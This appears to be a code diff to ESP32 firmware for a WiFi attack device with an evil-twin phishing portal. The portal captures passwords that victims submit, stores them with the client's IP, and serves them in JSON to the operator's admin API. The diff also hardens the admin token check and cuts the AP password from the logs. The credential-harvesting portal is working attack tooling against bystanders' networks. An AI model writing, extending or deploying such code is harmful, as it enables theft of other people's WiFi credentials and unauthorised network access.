@@ -287,7 +287,7 @@ static EvilTwinState sEvilTwin;
 
 struct CredentialEntry {
   uint32_t id;
-  char mac[20];
+  char clientIp[20];
   char pass[64];
   uint32_t capturedAt;
 };
@@ -296,15 +296,15 @@ static uint8_t sCredHead = 0;
 static uint8_t sCredCount = 0;
 static uint32_t sCredId = 0;
 
-static void addCredential(const String &mac, const String &pass) {
+static void addCredential(const String &clientIp, const String &pass) {
   CredentialEntry &e = sCreds[sCredHead];
   e.id = ++sCredId;
-  strlcpy(e.mac, mac.c_str(), sizeof(e.mac));
+  strlcpy(e.clientIp, clientIp.c_str(), sizeof(e.clientIp));
   strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
   e.capturedAt = millis();
   sCredHead = (sCredHead + 1) % 16;
   if (sCredCount < 16) sCredCount++;
-  log("[eviltwin] 捕获到客户端提交的凭据: MAC=" + mac + " 密码长度=" + String(pass.length()) +
+  log("[eviltwin] 捕获到客户端提交的凭据: IP=" + clientIp + " 密码长度=" + String(pass.length()) +
       " (明文仅存于凭据表, 不写入日志/串口遥测)");
 }
 
@@ -2585,7 +2585,8 @@ static void handleEvilTwinCreds() {
     uint32_t elapsedSec = (now >= sCreds[idx].capturedAt) ? ((now - sCreds[idx].capturedAt) / 1000) : 0;
     String timeStr = (elapsedSec < 3) ? "刚刚" : (String(elapsedSec) + "秒前");
     json += "{\"id\":" + String(sCreds[idx].id) +
-            ",\"mac\":\"" + jsonEscape(String(sCreds[idx].mac)) +
+            ",\"clientIp\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
+            "\",\"mac\":\"" + jsonEscape(String(sCreds[idx].clientIp)) +
             "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
             "\",\"time\":\"" + jsonEscape(timeStr) + "\"}";
   }
@@ -3930,16 +3931,19 @@ static void redirectToAdmin() {
  * admin.html 只含登录壳与界面代码, 真正的数据边界在 API;
  * 钓鱼门户 /api/portal/submit 保持开放 (凭据捕获流程所需)。
  */
-// 常量时间比较: 长度不提前返回, 避免通过响应耗时推测口令长度或前缀
+// 常量时间比较: 长度不提前返回, 避免通过响应耗时推测口令长度或前缀;
+// 长度差异以完整 size_t 判定, 不截断至 8 位整数, 杜绝长度差为 256 倍数时的边界截断风险
 static bool tokenEquals(const String &a, const String &b) {
-  size_t n = (a.length() > b.length()) ? a.length() : b.length();
-  uint8_t diff = (uint8_t)(a.length() ^ b.length());
+  size_t lenA = a.length();
+  size_t lenB = b.length();
+  size_t n = (lenA > lenB) ? lenA : lenB;
+  uint32_t charDiff = 0;
   for (size_t i = 0; i < n; i++) {
-    uint8_t x = (i < a.length()) ? (uint8_t)a[i] : 0;
-    uint8_t y = (i < b.length()) ? (uint8_t)b[i] : 0;
-    diff |= (uint8_t)(x ^ y);
+    uint8_t x = (i < lenA) ? (uint8_t)a[i] : 0;
+    uint8_t y = (i < lenB) ? (uint8_t)b[i] : 0;
+    charDiff |= (uint32_t)(x ^ y);
   }
-  return diff == 0;
+  return (charDiff == 0) && (lenA == lenB);
 }
 
 static bool adminAuthorized() {
@@ -4023,8 +4027,9 @@ void setup() {
     WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
   }
   apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
-  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" +
+  log("[wifi] AP 已启动: SSID=" + apSsid + "  信道=" +
       String(apChannel) + (isBand5G(apChannel) ? " (5G)" : " (2.4G)"));
+  Serial.println("[wifi] AP 初始口令: " + String(AP_PASSWORD) + " (安全建议: 首次连接后请及时更换)");
   log("[wifi] 后台: " + String(ADMIN_HTML_C));
   log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
   // 首次上电 / 恢复出厂 / 从旧版静态口令升级 → 轮换为设备唯一随机口令。
